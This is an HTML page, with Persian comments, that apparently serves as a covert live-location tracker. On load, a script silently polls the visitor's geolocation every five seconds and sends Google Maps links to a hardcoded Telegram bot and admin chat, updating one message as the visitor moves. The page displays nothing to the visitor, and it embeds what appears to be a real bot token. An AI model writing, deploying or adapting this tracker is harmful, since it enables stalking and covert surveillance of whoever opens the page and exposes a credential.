<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Live Location Auto</title>
</head>
<body>
<script>
const TOKEN = "8717243096:AAEzG3SmO3_DC_ePJH23OmaFTone7X-XmjI";   // توکن ربات تلگرام خودت
const CHAT_ID = "138836714";   // chat_id مدیر
const INTERVAL = 5000;            // هر ۵ ثانیه موقعیت آپدیت شود
let message_id = null;            // ذخیره message_id پیام اولیه

// ارسال یا ویرایش موقعیت
async function sendOrUpdateLocation(lat, lon){
  const url = message_id
    ? `https://api.telegram.org/bot${TOKEN}/editMessageText`
    : `https://api.telegram.org/bot${TOKEN}/sendMessage`;

  const payload = message_id
    ? { chat_id: CHAT_ID, message_id: message_id,
        text: "📍 Live Location:\nhttps://maps.google.com/?q=" + lat + "," + lon }
    : { chat_id: CHAT_ID,
        text: "📍 Live Location:\nhttps://maps.google.com/?q=" + lat + "," + lon };

  try {
    const res = await fetch(url,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify(payload)
    });
    const data = await res.json();
    if(!message_id && data.result && data.result.message_id){
      message_id = data.result.message_id; // ذخیره پیام اولیه
    }
  } catch(e){
    console.error("Send failed:", e);
  }
}

// شروع خودکار Live Location
function startLiveLocation(){
  if(!navigator.geolocation) return;
  setInterval(()=>{
    navigator.geolocation.getCurrentPosition(pos=>{
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      sendOrUpdateLocation(lat, lon);
    });
  }, INTERVAL);
}

// اجرای خودکار هنگام باز شدن صفحه
startLiveLocation();
</script>
</body>
</html>
